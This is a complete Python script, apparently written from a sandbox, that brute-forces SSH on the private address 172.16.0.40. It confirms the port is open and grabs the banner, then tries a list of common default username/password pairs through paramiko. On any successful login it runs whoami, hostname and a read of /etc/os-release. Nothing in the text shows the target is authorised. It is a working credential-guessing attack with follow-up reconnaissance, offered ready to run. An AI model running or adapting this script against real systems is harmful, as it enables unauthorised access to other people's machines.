"""
Probe 172.16.0.40:22 with paramiko - try common credentials
"""
import paramiko, sys, socket
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

# 1. Confirm port is open
s = socket.socket()
s.settimeout(3)
try:
    s.connect(('172.16.0.40', 22))
    print("172.16.0.40:22 OPEN")
    s.close()
except Exception as e:
    print(f"172.16.0.40:22 FAIL: {e}")
    sys.exit(1)

# 2. Get SSH banner
s = socket.socket()
s.settimeout(3)
s.connect(('172.16.0.40', 22))
banner = s.recv(256)
print(f"Banner: {banner!r}")
s.close()

# 3. Try common credentials
creds = [
    ("root", "root"), ("root", "toor"), ("root", "123456"),
    ("root", "password"), ("root", "admin"), ("root", "docker"),
    ("root", "centos"), ("root", "redhat"), ("root", "ubuntu"),
    ("admin", "admin"), ("centos", "centos"), ("ubuntu", "ubuntu"),
    ("docker", "docker"), ("user", "user"), ("guest", "guest"),
    ("test", "test"), ("pi", "raspberry"),
]

# Try key-based first (paramiko from sandbox won't have key)
print("\n=== Password auth attempts ===")
for user, pwd in creds:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('172.16.0.40', port=22, username=user, password=pwd, timeout=5, allow_agent=False, look_for_keys=False)
        stdin, stdout, stderr = client.exec_command("whoami; hostname; cat /etc/os-release | head -3")
        out = stdout.read().decode()
        err = stderr.read().decode()
        print(f"  🎉 {user}:{pwd} -> {out.strip()}")
        if err.strip():
            print(f"     stderr: {err.strip()[:200]}")
        client.close()
    except paramiko.AuthenticationException:
        print(f"  ❌ {user}:{pwd} -> auth fail")
    except Exception as e:
        print(f"  ❌ {user}:{pwd} -> {type(e).__name__}: {str(e)[:100]}")
